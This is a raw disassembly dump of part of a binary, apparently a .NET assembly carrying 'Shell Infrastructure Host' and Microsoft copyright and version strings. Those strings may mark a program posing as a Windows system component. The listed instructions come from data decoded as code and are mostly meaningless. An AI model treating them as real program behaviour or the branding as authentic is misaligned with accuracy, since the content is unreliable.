  409b08:	00 31                	add    %dh,(%rcx)
  409b0a:	00 7d 00             	add    %bh,0x0(%rbp)
  409b0d:	00 33                	add    %dh,(%rbx)
  409b0f:	7b 00                	jnp    0x409b11
  409b11:	31 00                	xor    %eax,(%rax)
  409b13:	31 00                	xor    %eax,(%rax)
  409b15:	31 00                	xor    %eax,(%rax)
  409b17:	31 00                	xor    %eax,(%rax)
  409b19:	31 00                	xor    %eax,(%rax)
  409b1b:	2d 00 32 00 32       	sub    $0x32003200,%eax
  409b20:	00 32                	add    %dh,(%rdx)
  409b22:	00 32                	add    %dh,(%rdx)
  409b24:	00 32                	add    %dh,(%rdx)
  409b26:	00 2d 00 35 00 30    	add    %ch,0x30003500(%rip)        # 0x3040d02c
  409b2c:	00 30                	add    %dh,(%rax)
  409b2e:	00 30                	add    %dh,(%rax)
  409b30:	00 31                	add    %dh,(%rcx)
  409b32:	00 2d 00 30 00 30    	add    %ch,0x30003000(%rip)        # 0x3040cb38
  409b38:	00 30                	add    %dh,(%rax)
  409b3a:	00 30                	add    %dh,(%rax)
  409b3c:	00 32                	add    %dh,(%rdx)
  409b3e:	00 7d 00             	add    %bh,0x0(%rbp)
  409b41:	00 00                	add    %al,(%rax)
  409b43:	00 cb                	add    %cl,%bl
  409b45:	58                   	pop    %rax
  409b46:	2e ae                	cs scas (%rdi),%al
  409b48:	a0 95 d2 4b b2 1c 35 	movabs 0xc9d4351cb24bd295,%al
  409b4f:	d4 c9 
  409b51:	38 88 5a 00 1e 01    	cmp    %cl,0x11e005a(%rax)
  409b57:	00 19                	add    %bl,(%rcx)
  409b59:	53                   	push   %rbx
  409b5a:	68 65 6c 6c 20       	push   $0x206c6c65
  409b5f:	49 6e                	rex.WB outsb (%rsi),(%dx)
  409b61:	66 72 61             	data16 jb 0x409bc5
  409b64:	73 74                	jae    0x409bda
  409b66:	72 75                	jb     0x409bdd
  409b68:	63 74 75 72          	movsxd 0x72(%rbp,%rsi,2),%esi
  409b6c:	65 20 48 6f          	and    %cl,%gs:0x6f(%rax)
  409b70:	73 74                	jae    0x409be6
  409b72:	00 00                	add    %al,(%rax)
  409b74:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%rdi)
  409b7a:	34 e0                	xor    $0xe0,%al
  409b7c:	89 04 20             	mov    %eax,(%rax,%riz,1)
  409b7f:	01 01                	add    %eax,(%rcx)
  409b81:	0e                   	(bad)
  409b82:	2b 01                	sub    (%rcx),%eax
  409b84:	00 26                	add    %ah,(%rsi)
  409b86:	4d 69 63 72 6f 73 6f 	imul   $0x666f736f,0x72(%r11),%r12
  409b8d:	66 
  409b8e:	74 c2                	je     0x409b52
  409b90:	ae                   	scas   (%rdi),%al
  409b91:	20 57 69             	and    %dl,0x69(%rdi)
  409b94:	6e                   	outsb  (%rsi),(%dx)
  409b95:	64 6f                	outsl  %fs:(%rsi),(%dx)
  409b97:	77 73                	ja     0x409c0c
  409b99:	c2 ae 20             	ret    $0x20ae
  409b9c:	4f 70 65             	rex.WRXB jo 0x409c04
  409b9f:	72 61                	jb     0x409c02
  409ba1:	74 69                	je     0x409c0c
  409ba3:	6e                   	outsb  (%rsi),(%dx)
  409ba4:	67 20 53 79          	and    %dl,0x79(%ebx)
  409ba8:	73 74                	jae    0x409c1e
  409baa:	65 6d                	gs insl (%dx),(%rdi)
  409bac:	00 00                	add    %al,(%rax)
  409bae:	33 01                	xor    (%rcx),%eax
  409bb0:	00 2e                	add    %ch,(%rsi)
  409bb2:	c2 a9 20             	ret    $0x20a9
  409bb5:	4d 69 63 72 6f 73 6f 	imul   $0x666f736f,0x72(%r11),%r12
  409bbc:	66 
  409bbd:	74 20                	je     0x409bdf
  409bbf:	43 6f                	rex.XB outsl (%rsi),(%dx)
  409bc1:	72 70                	jb     0x409c33
  409bc3:	6f                   	outsl  (%rsi),(%dx)
  409bc4:	72 61                	jb     0x409c27
  409bc6:	74 69                	je     0x409c31
  409bc8:	6f                   	outsl  (%rsi),(%dx)
  409bc9:	6e                   	outsb  (%rsi),(%dx)
  409bca:	2e 20 41 6c          	cs and %al,0x6c(%rcx)
  409bce:	6c                   	insb   (%dx),(%rdi)
  409bcf:	20 52 69             	and    %dl,0x69(%rdx)
  409bd2:	67 68 74 73 20 52    	addr32 push $0x52207374
  409bd8:	65 73 65             	gs jae 0x409c40
  409bdb:	72 76                	jb     0x409c53
  409bdd:	65 64 2e 00 00       	gs fs add %al,%fs:(%rax)
  409be2:	13 01                	adc    (%rcx),%eax
  409be4:	00 0e                	add    %cl,(%rsi)
  409be6:	31 30                	xor    %esi,(%rax)
  409be8:	2e 30 2e             	cs xor %ch,(%rsi)
  409beb:	31 39                	xor    %edi,(%rcx)
  409bed:	30 34 31             	xor    %dh,(%rcx,%rsi,1)
  409bf0:	2e 37                	cs (bad)
  409bf2:	34 36                	xor    $0x36,%al
  409bf4:	00 00                	add    %al,(%rax)
  409bf6:	08 01                	or     %al,(%rcx)
  409bf8:	00 08                	add    %cl,(%rax)
  409bfa:	00 00                	add    %al,(%rax)
  409bfc:	00 00                	add    %al,(%rax)
  409bfe:	00 04 20             	add    %al,(%rax,%riz,1)
  409c01:	01 01                	add    %eax,(%rcx)
  409c03:	08 1e                	or     %bl,(%rsi)
  409c05:	01 00                	add    %eax,(%rax)
  409c07:	01 00                	add    %eax,(%rax)
  409c09:	54                   	push   %rsp
  409c0a:	02 16                	add    (%rsi),%dl
  409c0c:	57                   	push   %rdi
  409c0d:	72 61                	jb     0x409c70
  409c0f:	70 4e                	jo     0x409c5f
  409c11:	6f                   	outsl  (%rsi),(%dx)
  409c12:	6e                   	outsb  (%rsi),(%dx)
  409c13:	45 78 63             	rex.RB js 0x409c79
  409c16:	65 70 74             	gs jo  0x409c8d
  409c19:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%rdi),%ebp
  409c20:	77 73                	ja     0x409c95
  409c22:	01 03                	add    %eax,(%rbx)
  409c24:	20 00                	and    %al,(%rax)
  409c26:	01 03                	add    %eax,(%rbx)
  409c28:	06                   	(bad)
  409c29:	1d 05 02 06 08       	sbb    $0x8060205,%eax
  409c2e:	02 06                	add    (%rsi),%al
  409c30:	0e                   	(bad)
  409c31:	03 00                	add    (%rax),%eax
  409c33:	00 01                	add    %al,(%rcx)
  409c35:	05 00 01 1d 05       	add    $0x51d0100,%eax
  409c3a:	0e                   	(bad)
  409c3b:	04 00                	add    $0x0,%al
  409c3d:	01 01                	add    %eax,(%rcx)
  409c3f:	08 08                	or     %cl,(%rax)
  409c41:	b0 3f                	mov    $0x3f,%al
  409c43:	5f                   	pop    %rdi
  409c44:	7f 11                	jg     0x409c57
  409c46:	d5 0a 3a 2b          	{rex2 0xa} cmp (%rbx),%bpl
  409c4a:	07                   	(bad)
  409c4b:	16                   	(bad)
  409c4c:	0e                   	(bad)
  409c4d:	12 55 12             	adc    0x12(%rbp),%dl
  409c50:	59                   	pop    %rcx
  409c51:	12 5d 12             	adc    0x12(%rbp),%bl
  409c54:	61                   	(bad)
  409c55:	02 0e                	add    (%rsi),%cl
  409c57:	12 5d 12             	adc    0x12(%rbp),%bl
  409c5a:	61                   	(bad)
  409c5b:	1d 1d 0e 02 1d       	sbb    $0x1d020e1d,%eax
  409c60:	0e                   	(bad)
  409c61:	12 65 12             	adc    0x12(%rbp),%ah
  409c64:	69 1c 1d 1c 12 69 1d 	imul   $0xe1d0e1d,0x1d69121c(,%rbx,1),%ebx
  409c6b:	1d 0e 1d 0e 
  409c6f:	1d 0e 1d 1d 0e       	sbb    $0xe1d1d0e,%eax
  409c74:	08 05 20 01 01 11    	or     %al,0x11010120(%rip)        # 0x11419d9a
  409c7a:	6d                   	insl   (%dx),(%rdi)
  409c7b:	06                   	(bad)
  409c7c:	20 02                	and    %al,(%rdx)
  409c7e:	01 0e                	add    %ecx,(%rsi)
  409c80:	12 55 07             	adc    0x7(%rbp),%dl
  409c83:	20 02                	and    %al,(%rdx)
  409c85:	01 12                	add    %edx,(%rdx)
  409c87:	59                   	pop    %rcx
  409c88:	12 71 04             	adc    0x4(%rcx),%dh
  409c8b:	20 00                	and    %al,(%rax)
  409c8d:	12 5d 04             	adc    0x4(%rbp),%bl
  409c90:	20 00                	and    %al,(%rax)
  409c92:	12 69 04             	adc    0x4(%rcx),%ch
  409c95:	20 00                	and    %al,(%rax)
  409c97:	12 79 04             	adc    0x4(%rcx),%bh
  409c9a:	20 01                	and    %al,(%rcx)
  409c9c:	1c 0e                	sbb    $0xe,%al
  409c9e:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  409ca3:	1c 03                	sbb    $0x3,%al
  409ca5:	20 00                	and    %al,(%rax)
  409ca7:	02 07                	add    (%rdi),%al
  409ca9:	20 02                	and    %al,(%rdx)
  409cab:	08 0e                	or     %cl,(%rsi)
  409cad:	11 80 81 03 20 00    	adc    %eax,0x200381(%rax)
  409cb3:	0e                   	(bad)
  409cb4:	04 20                	add    $0x20,%al
  409cb6:	01 02                	add    %eax,(%rdx)
  409cb8:	0e                   	(bad)
  409cb9:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  409cbe:	0e                   	(bad)
  409cbf:	02 1d 0e 05 00 02    	add    0x200050e(%rip),%bl        # 0x240a1d3
  409cc5:	02 0e                	add    (%rsi),%cl
  409cc7:	0e                   	(bad)
  409cc8:	04 00                	add    $0x0,%al
  409cca:	01 02                	add    %eax,(%rdx)
  409ccc:	0e                   	(bad)
  409ccd:	06                   	(bad)
  409cce:	00 02                	add    %al,(%rdx)
  409cd0:	01 0e                	add    %ecx,(%rsi)
  409cd2:	1d 05 06 20 01       	sbb    $0x1200605,%eax
  409cd7:	01 11                	add    %edx,(%rcx)
  409cd9:	80 85 04 00 01 0e 0e 	addb   $0xe,0xe010004(%rbp)
  409ce0:	04 20                	add    $0x20,%al
  409ce2:	01 01                	add    %eax,(%rcx)
  409ce4:	02 07                	add    (%rdi),%al
  409ce6:	00 01                	add    %al,(%rcx)
  409ce8:	12 80 8d 12 65 05    	adc    0x565128d(%rax),%al
  409cee:	00 00                	add    %al,(%rax)
  409cf0:	12 80 95 05 20 01    	adc    0x1200595(%rax),%al
  409cf6:	0e                   	(bad)
  409cf7:	1d 05 01 00 07       	sbb    $0x7000105,%eax
  409cfc:	00 02                	add    %al,(%rdx)
  409cfe:	1d 05 1d 05 02       	sbb    $0x2051d05,%eax
  409d03:	18 07                	sbb    %al,(%rdi)
  409d05:	08 1d 05 12 80 9d    	or     %bl,-0x627fedfb(%rip)        # 0xffffffff9dc0af10
  409d0b:	12 80 a1 12 80 a5    	adc    -0x5a7fed5f(%rax),%al
  409d11:	12 80 a9 12 80 ad    	adc    -0x527fed57(%rax),%al
  409d17:	12 80 a1 1d 05 05    	adc    0x5051da1(%rax),%al
  409d1d:	20 01                	and    %al,(%rcx)
  409d1f:	1d 05 0e 07 20       	sbb    $0x20070e05,%eax
  409d24:	03 01                	add    (%rcx),%eax
  409d26:	0e                   	(bad)
  409d27:	1d 05 08 06 20       	sbb    $0x20060805,%eax
  409d2c:	01 01                	add    %eax,(%rcx)
  409d2e:	11 80 b5 05 20 01    	adc    %eax,0x12005b5(%rax)
  409d34:	1d 05 08 09 20       	sbb    $0x20090805,%eax
  409d39:	02 12                	add    (%rdx),%dl
  409d3b:	80 a5 1d 05 1d 05 0c 	andb   $0xc,0x51d051d(%rbp)
  409d42:	20 03                	and    %al,(%rbx)
  409d44:	01 12                	add    %edx,(%rdx)
  409d46:	80 bd 12 80 a5 11 80 	cmpb   $0x80,0x11a58012(%rbp)
  409d4d:	c1 07 20             	roll   $0x20,(%rdi)
  409d50:	03 01                	add    (%rcx),%eax
  409d52:	1d 05 08 08 04       	sbb    $0x4080805,%eax
  409d57:	20 00                	and    %al,(%rax)
  409d59:	1d 05 05 00 02       	sbb    $0x2000505,%eax
  409d5e:	01 0e                	add    %ecx,(%rsi)
  409d60:	0e                   	(bad)
  409d61:	04 07                	add    $0x7,%al
  409d63:	01 12                	add    %edx,(%rdx)
  409d65:	65 03 00             	add    %gs:(%rax),%eax
  409d68:	00 0e                	add    %cl,(%rsi)
  409d6a:	06                   	(bad)
  409d6b:	00 01                	add    %al,(%rcx)
  409d6d:	0e                   	(bad)
  409d6e:	11 80 c5 04 06 12    	adc    %eax,0x120604c5(%rax)
  409d74:	80 c9 10             	or     $0x10,%cl
  409d77:	07                   	(bad)
  409d78:	05 12 80 cd 12       	add    $0x12cd8012,%eax
  409d7d:	80 d1 12             	adc    $0x12,%cl
  409d80:	80 d5 1d             	adc    $0x1d,%ch
  409d83:	12 80 d1 08 06 20    	adc    0x200608d1(%rax),%al
  409d89:	01 12                	add    %edx,(%rdx)
  409d8b:	80 cd 08             	or     $0x8,%ch
  409d8e:	06                   	(bad)
  409d8f:	20 00                	and    %al,(%rax)
  409d91:	1d 12 80 d1 03       	sbb    $0x3d18012,%eax
  409d96:	20 00                	and    %al,(%rax)
  409d98:	08 06                	or     %al,(%rsi)
  409d9a:	20 01                	and    %al,(%rcx)
  409d9c:	12 80 dd 08 0b 00    	adc    0xb08dd(%rax),%al
  409da2:	02 12                	add    (%rdx),%dl
  409da4:	80 e1 12             	and    $0x12,%cl
  409da7:	80 cd 12             	or     $0x12,%ch
  409daa:	80 d5 05             	adc    $0x5,%ch
  409dad:	20 02                	and    %al,(%rdx)
  409daf:	01 1c 1c             	add    %ebx,(%rsp,%rbx,1)
  409db2:	08 00                	or     %al,(%rax)
  409db4:	01 12                	add    %edx,(%rdx)
  409db6:	80 cd 11             	or     $0x11,%ch
  409db9:	80 e5 05             	and    $0x5,%ch
  409dbc:	20 00                	and    %al,(%rax)
  409dbe:	12 80 e9 05 20 00    	adc    0x2005e9(%rax),%al
  409dc4:	12 80 c9 05 20 02    	adc    0x22005c9(%rax),%al
  409dca:	01 1c 18             	add    %ebx,(%rax,%rbx,1)
  409dcd:	04 20                	add    $0x20,%al
  409dcf:	01 01                	add    %eax,(%rcx)
  409dd1:	1c 0a                	sbb    $0xa,%al
  409dd3:	20 03                	and    %al,(%rbx)
  409dd5:	12 80 f1 1c 12 80    	adc    -0x7fede30f(%rax),%al
  409ddb:	f5                   	cmc
  409ddc:	1c 06                	sbb    $0x6,%al
  409dde:	20 01                	and    %al,(%rcx)
  409de0:	01 12                	add    %edx,(%rdx)
  409de2:	80 f1 02             	xor    $0x2,%cl
  409de5:	06                   	(bad)
  409de6:	02 02                	add    (%rdx),%al
  409de8:	06                   	(bad)
  409de9:	18 03                	sbb    %al,(%rbx)
  409deb:	06                   	(bad)
  409dec:	1d 08 03 06 12       	sbb    $0x12060308,%eax
  409df1:	2c 04                	sub    $0x4,%al
  409df3:	06                   	(bad)
  409df4:	12 80 f9 02 06 1c    	adc    0x1c0602f9(%rax),%al
  409dfa:	04 06                	add    $0x6,%al
  409dfc:	12 80 e9 04 06 12    	adc    0x120604e9(%rax),%al
  409e02:	80 fd 02             	cmp    $0x2,%ch
  409e05:	06                   	(bad)
  409e06:	0a 03                	or     (%rbx),%al
  409e08:	06                   	(bad)
  409e09:	1d 09 09 00 02       	sbb    $0x2000909,%eax
  409e0e:	01 12                	add    %edx,(%rdx)
  409e10:	81 0d 11 81 11 04 00 	orl    $0x2010100,0x4118111(%rip)        # 0x4521f2b
  409e17:	01 01 02 
  409e1a:	06                   	(bad)
  409e1b:	00 01                	add    %al,(%rcx)
  409e1d:	1d 05 1d 05 1a       	sbb    $0x1a051d05,%eax
  409e22:	07                   	(bad)
  409e23:	15 1d 09 1d 05       	adc    $0x51d091d,%eax
  409e28:	09 09                	or     %ecx,(%rcx)
  409e2a:	0b 09                	or     (%rcx),%ecx
  409e2c:	08 08                	or     %cl,(%rax)
  409e2e:	08 09                	or     %cl,(%rcx)
  409e30:	09 09                	or     %ecx,(%rcx)
  409e32:	09 09                	or     %ecx,(%rcx)
  409e34:	09 09                	or     %ecx,(%rcx)
  409e36:	09 09                	or     %ecx,(%rcx)
  409e38:	09 09                	or     %ecx,(%rcx)
  409e3a:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  409e3f:	1d 05 09 0c 00       	sbb    $0xc0905,%eax
  409e44:	05 01 12 81 0d       	add    $0xd811201,%eax
  409e49:	08 12                	or     %dl,(%rdx)
  409e4b:	81 0d 08 08 0d 00 08 	orl    $0x9100108,0xd0808(%rip)        # 0x4da65d
  409e52:	01 10 09 
  409e55:	09 09                	or     %ecx,(%rcx)
  409e57:	09 09                	or     %ecx,(%rcx)
  409e59:	07                   	(bad)
  409e5a:	09 1d 09 05 00 02    	or     %ebx,0x2000509(%rip)        # 0x240a369
  409e60:	09 09                	or     %ecx,(%rcx)
  409e62:	07                   	(bad)
  409e63:	03 00                	add    (%rax),%eax
  409e65:	00 02                	add    %al,(%rdx)
  409e67:	05 00 00 12 80       	add    $0x80120000,%eax
  409e6c:	b1 05                	mov    $0x5,%cl
  409e6e:	07                   	(bad)
  409e6f:	01 12                	add    %edx,(%rdx)
  409e71:	80 b1 07 00 02 12 81 	xorb   $0x81,0x12020007(%rcx)
  409e78:	2d 0e 0e 03 20       	sub    $0x20030e0e,%eax
  409e7d:	00 1c 06             	add    %bl,(%rsi,%rax,1)
  409e80:	20 01                	and    %al,(%rcx)
  409e82:	1d 05 1d 05 04       	sbb    $0x4051d05,%eax
  409e87:	00 01                	add    %al,(%rcx)
  409e89:	09 09                	or     %ecx,(%rcx)
  409e8b:	04 00                	add    $0x0,%al
  409e8d:	01 0e                	add    %ecx,(%rsi)
  409e8f:	08 4b 07             	or     %cl,0x7(%rbx)
  409e92:	34 12                	xor    $0x12,%al
  409e94:	80 a9 08 09 1d 05 09 	subb   $0x9,0x51d0908(%rcx)
  409e9b:	09 12                	or     %edx,(%rdx)
  409e9d:	80 a5 12 80 ad 1d 05 	andb   $0x5,0x1dad8012(%rbp)
  409ea4:	09 09                	or     %ecx,(%rcx)
  409ea6:	08 08                	or     %cl,(%rax)
  409ea8:	09 09                	or     %ecx,(%rcx)
  409eaa:	0e                   	(bad)
  409eab:	08 09                	or     %cl,(%rcx)
  409ead:	09 09                	or     %ecx,(%rcx)
  409eaf:	08 0e                	or     %cl,(%rsi)
  409eb1:	08 08                	or     %cl,(%rax)
  409eb3:	1d 05 1d 05 09       	sbb    $0x9051d05,%eax
  409eb8:	08 09                	or     %cl,(%rcx)
  409eba:	08 08                	or     %cl,(%rax)
  409ebc:	09 12                	or     %edx,(%rdx)
  409ebe:	81 3d 12 80 b1 0e 08 	cmpl   $0x1d051d08,0xeb18012(%rip)        # 0xef21eda
  409ec5:	1d 05 1d 
  409ec8:	05 09 1d 05 08       	add    $0x8051d09,%eax
  409ecd:	1d 05 1d 05 08       	sbb    $0x8051d05,%eax
  409ed2:	08 08                	or     %cl,(%rax)
  409ed4:	08 1d 05 1d 05 09    	or     %bl,0x9051d05(%rip)        # 0x945bbdf
  409eda:	08 08                	or     %cl,(%rax)
  409edc:	06                   	(bad)
  409edd:	20 01                	and    %al,(%rcx)
  409edf:	01 12                	add    %edx,(%rdx)
  409ee1:	80 bd 04 07 01 1d 05 	cmpb   $0x5,0x1d010704(%rbp)
  409ee8:	07                   	(bad)
  409ee9:	20 03                	and    %al,(%rbx)
  409eeb:	0e                   	(bad)
  409eec:	1d 05 08 08 03       	sbb    $0x3080805,%eax
  409ef1:	00 00                	add    %al,(%rax)
  409ef3:	08 09                	or     %cl,(%rcx)
  409ef5:	00 02                	add    %al,(%rdx)
  409ef7:	12 80 e1 18 12 80    	adc    -0x7fede71f(%rax),%al
  409efd:	cd 08                	int    $0x8
  409eff:	07                   	(bad)
  409f00:	02 1d 12 80 cd 1d    	add    0x1dcd8012(%rip),%bl        # 0x1e0e1f18
  409f06:	1c 0a                	sbb    $0xa,%al
  409f08:	20 02                	and    %al,(%rdx)
  409f0a:	12 80 d5 0e 1d 12    	adc    0x121d0ed5(%rax),%al
  409f10:	80 cd 06             	or     $0x6,%ch
  409f13:	20 02                	and    %al,(%rdx)
  409f15:	1c 1c                	sbb    $0x1c,%al
  409f17:	1d 1c 04 00 01       	sbb    $0x100041c,%eax
  409f1c:	1c 1c                	sbb    $0x1c,%al
  409f1e:	03 07                	add    (%rdi),%eax
  409f20:	01 1c 05 20 00 12 81 	add    %ebx,-0x7eedffe0(,%rax,1)
  409f27:	45 05 20 02 0e 0e    	rex.RB add $0xe0e0220,%eax
  409f2d:	0e                   	(bad)
  409f2e:	05 20 00 12 80       	add    $0x80120020,%eax
  409f33:	cd 06                	int    $0x6
  409f35:	20 01                	and    %al,(%rcx)
  409f37:	12 81 49 0e 0b 07    	adc    0x70b0e49(%rcx),%al
  409f3d:	06                   	(bad)
  409f3e:	1d 05 12 81 4d       	sbb    $0x4d811205,%eax
  409f43:	08 0a                	or     %cl,(%rdx)
  409f45:	08 08                	or     %cl,(%rax)
  409f47:	0d 20 04 01 0e       	or     $0xe010420,%eax
  409f4c:	11 81 51 11 81 55    	adc    %eax,0x55811151(%rcx)
  409f52:	11 81 59 03 20 00    	adc    %eax,0x200359(%rcx)
  409f58:	0a 07                	or     (%rdi),%al
  409f5a:	20 03                	and    %al,(%rbx)
  409f5c:	08 1d 05 08 08 0d    	or     %bl,0xd080805(%rip)        # 0xd48a767
  409f62:	07                   	(bad)
  409f63:	04 12                	add    $0x12,%al
  409f65:	80 a9 12 80 b1 12 80 	subb   $0x80,0x12b18012(%rcx)
  409f6c:	ad                   	lods   (%rsi),%eax
  409f6d:	1d 05 05 20 01       	sbb    $0x1200505,%eax
  409f72:	01 1d 05 05 20 00    	add    %ebx,0x200505(%rip)        # 0x60a47d
  409f78:	12 80 a5 0c 07 07    	adc    0x7070ca5(%rax),%al
  409f7e:	0e                   	(bad)
  409f7f:	1d 05 1d 05 1d       	sbb    $0x1d051d05,%eax
  409f84:	05 08 08 08 07       	add    $0x7080808,%eax
  409f89:	07                   	(bad)
  409f8a:	03 0e                	add    (%rsi),%ecx
  409f8c:	1d 05 1d 05 05       	sbb    $0x5051d05,%eax
  409f91:	00 02                	add    %al,(%rdx)
  409f93:	1c 1c                	sbb    $0x1c,%al
  409f95:	1c 06                	sbb    $0x6,%al
  409f97:	20 01                	and    %al,(%rcx)
  409f99:	12 80 bd 0e 05 20    	adc    0x20050ebd(%rax),%al
  409f9f:	00 12                	add    %dl,(%rdx)
  409fa1:	80 bd 05 00 02 01 1c 	cmpb   $0x1c,0x1020005(%rbp)
  409fa8:	0a 04 20             	or     (%rax,%riz,1),%al
  409fab:	01 01                	add    %eax,(%rcx)
  409fad:	0a 04 00             	or     (%rax,%rax,1),%al
  409fb0:	01 0a                	add    %ecx,(%rdx)
  409fb2:	1c 05                	sbb    $0x5,%al
  409fb4:	00 02                	add    %al,(%rdx)
  409fb6:	1c 1c                	sbb    $0x1c,%al
  409fb8:	08 04 00             	or     %al,(%rax,%rax,1)
  409fbb:	01 01                	add    %eax,(%rcx)
  409fbd:	1c 06                	sbb    $0x6,%al
  409fbf:	00 01                	add    %al,(%rcx)
  409fc1:	01 12                	add    %edx,(%rdx)
  409fc3:	81 0d 03 00 00 1c 07 	orl    $0x1020007,0x1c000003(%rip)        # 0x1c409fd0
  409fca:	00 02 01 
  409fcd:	1c 11                	sbb    $0x11,%al
  409fcf:	80 b5 06 00 03 1c 1c 	xorb   $0x1c,0x1c030006(%rbp)
  409fd6:	1c 1c                	sbb    $0x1c,%al
  409fd8:	07                   	(bad)
  409fd9:	00 04 01             	add    %al,(%rcx,%rax,1)
  409fdc:	1c 1c                	sbb    $0x1c,%al
  409fde:	08 08                	or     %cl,(%rax)
  409fe0:	05 00 02 08 1c       	add    $0x1c080200,%eax
  409fe5:	08 06                	or     %al,(%rsi)
  409fe7:	00 02                	add    %al,(%rdx)
  409fe9:	08 1d 05 08 07 00    	or     %bl,0x70805(%rip)        # 0x47a7f4
  409fef:	04 1c                	add    $0x1c,%al
  409ff1:	1c 1c                	sbb    $0x1c,%al
  409ff3:	08 08                	or     %cl,(%rax)
  409ff5:	13 07                	adc    (%rdi),%eax
  409ff7:	07                   	(bad)
  409ff8:	1d 05 1d 05 1d       	sbb    $0x1d051d05,%eax
  409ffd:	05 1d 05 12 80       	add    $0x8012051d,%eax
  40a002:	a9 12 80 b1 12       	test   $0x12b18012,%eax
  40a007:	80 ad 05 00 01 0e 1d 	subb   $0x1d,0xe010005(%rbp)
  40a00e:	05 01 08 0a 20       	add    $0x200a0801,%eax
  40a013:	06                   	(bad)
  40a014:	09 18                	or     %ebx,(%rax)
  40a016:	18 18                	sbb    %bl,(%rax)
  40a018:	09 18                	or     %ebx,(%rax)
  40a01a:	10 09                	adc    %cl,(%rcx)
  40a01c:	10 20                	adc    %ah,(%rax)
  40a01e:	08 12                	or     %dl,(%rdx)
  40a020:	80 f1 18             	xor    $0x18,%cl
  40a023:	18 18                	sbb    %bl,(%rax)
  40a025:	09 18                	or     %ebx,(%rax)
  40a027:	10 09                	adc    %cl,(%rcx)
  40a029:	12 80 f5 1c 08 20    	adc    0x20081cf5(%rax),%al
  40a02f:	02 09                	add    (%rcx),%cl
  40a031:	10 09                	adc    %cl,(%rcx)
  40a033:	12 80 f1 03 20 00    	adc    0x2003f1(%rax),%al
  40a039:	18 09                	sbb    %cl,(%rcx)
  40a03b:	20 02                	and    %al,(%rdx)
  40a03d:	12 80 f1 12 80 f5    	adc    -0xa7fed0f(%rax),%al
  40a043:	1c 06                	sbb    $0x6,%al
  40a045:	20 01                	and    %al,(%rcx)
  40a047:	18 12                	sbb    %dl,(%rdx)
  40a049:	80 f1 03             	xor    $0x3,%cl
  40a04c:	06                   	(bad)
  40a04d:	11 44 03 06          	adc    %eax,0x6(%rbx,%rax,1)
  40a051:	11 48 03             	adc    %ecx,0x3(%rax)
  40a054:	06                   	(bad)
  40a055:	11 4c 03 06          	adc    %ecx,0x6(%rbx,%rax,1)
  40a059:	11 50 03             	adc    %edx,0x3(%rax)
  40a05c:	06                   	(bad)
  40a05d:	11 54 03 06          	adc    %edx,0x6(%rbx,%rax,1)
  40a061:	11 58 03             	adc    %ebx,0x3(%rax)
  40a064:	06                   	(bad)
  40a065:	11 5c 80 b4          	adc    %ebx,-0x4c(%rax,%rax,4)
  40a069:	01 00                	add    %eax,(%rax)
  40a06b:	50                   	push   %rax
  40a06c:	80 ad 73 4d 73 6b 64 	subb   $0x64,0x6b734d73(%rbp)
  40a073:	51                   	push   %rcx
  40a074:	51                   	push   %rcx
  40a075:	6c                   	insb   (%dx),(%rdi)
  40a076:	31 59 41             	xor    %ebx,0x41(%rcx)
  40a079:	79 6c                	jns    0x40a0e7
  40a07b:	62 37 73 55 73       	(bad)
  40a080:	2e 6d                	cs insl (%dx),(%rdi)
  40a082:	4a 33 30             	rex.WX xor (%rax),%rsi
  40a085:	34 74                	xor    $0x74,%al
  40a087:	6a 35                	push   $0x35
  40a089:	56                   	push   %rsi
  40a08a:	31 6d 4f             	xor    %ebp,0x4f(%rbp)
  40a08d:	4b 37                	rex.WXB (bad)
  40a08f:	6e                   	outsb  (%rsi),(%dx)
  40a090:	42 59                	rex.X pop %rcx
  40a092:	69 2b 6c 30 41 6a    	imul   $0x6a41306c,(%rbx),%ebp
  40a098:	33 78 71             	xor    0x71(%rax),%edi
  40a09b:	52                   	push   %rdx
  40a09c:	4c 78 42             	rex.WR js 0x40a0e1
  40a09f:	35 43 56 75 49       	xor    $0x49755643,%eax
  40a0a4:	31 35 2b 62 74 42    	xor    %esi,0x4274622b(%rip)        # 0x42b502d5
  40a0aa:	68 36 48 67 79       	push   $0x79674836
  40a0af:	56                   	push   %rsi
  40a0b0:	72 6b                	jb     0x40a11d
  40a0b2:	72 51                	jb     0x40a105
  40a0b4:	69 4c 71 51 43 60 31 	imul   $0x5b316043,0x51(%rcx,%rsi,2),%ecx
  40a0bb:	5b 
  40a0bc:	5b                   	pop    %rbx
  40a0bd:	53                   	push   %rbx
  40a0be:	79 73                	jns    0x40a133
  40a0c0:	74 65                	je     0x40a127
  40a0c2:	6d                   	insl   (%dx),(%rdi)
  40a0c3:	2e 4f 62 6a 65 63 74 	(bad)
  40a0ca:	2c 20                	sub    $0x20,%al
  40a0cc:	6d                   	insl   (%dx),(%rdi)
  40a0cd:	73 63                	jae    0x40a132
  40a0cf:	6f                   	outsl  (%rsi),(%dx)
  40a0d0:	72 6c                	jb     0x40a13e
  40a0d2:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%rdx),%esp
  40a0d9:	73 69                	jae    0x40a144
  40a0db:	6f                   	outsl  (%rsi),(%dx)
  40a0dc:	6e                   	outsb  (%rsi),(%dx)
  40a0dd:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  40a0e2:	30 2e                	xor    %ch,(%rsi)
  40a0e4:	30 2c 20             	xor    %ch,(%rax,%riz,1)
  40a0e7:	43 75 6c             	rex.XB jne 0x40a156
  40a0ea:	74 75                	je     0x40a161
  40a0ec:	72 65                	jb     0x40a153
  40a0ee:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40a0f3:	72 61                	jb     0x40a156
  40a0f5:	6c                   	insb   (%dx),(%rdi)
  40a0f6:	2c 20                	sub    $0x20,%al
  40a0f8:	50                   	push   %rax
  40a0f9:	75 62                	jne    0x40a15d
  40a0fb:	6c                   	insb   (%dx),(%rdi)
  40a0fc:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
  40a103:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
  40a107:	62 37 37 61 35       	(bad)
  40a10c:	63 35 36 31 39 33    	movsxd 0x33393136(%rip),%esi        # 0x3379d248
  40a112:	34 65                	xor    $0x65,%al
  40a114:	30 38                	xor    %bh,(%rax)
  40a116:	39 5d 5d             	cmp    %ebx,0x5d(%rbp)
